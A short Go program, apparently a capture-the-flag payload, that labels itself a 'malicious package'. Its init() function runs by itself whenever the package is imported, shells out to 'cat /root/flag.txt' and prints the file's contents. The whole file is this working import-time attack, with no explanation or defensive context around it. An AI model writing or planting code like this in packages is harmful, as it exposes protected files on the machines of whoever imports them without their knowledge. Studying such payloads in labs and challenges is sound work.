package main

import (
	"fmt"
	"os/exec"
)

func init() {
	// This will be automatically called when the package is imported
	cmd := exec.Command("cat", "/root/flag.txt")
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println("Error reading flag:", err)
		return
	}

	// Print the flag
	fmt.Printf("Flag: %s\n", output)
}

func main() {
	// The main function is just here to make sure the package runs without errors
	// The real action happens in init()
	fmt.Println("Malicious package initialized.")
}
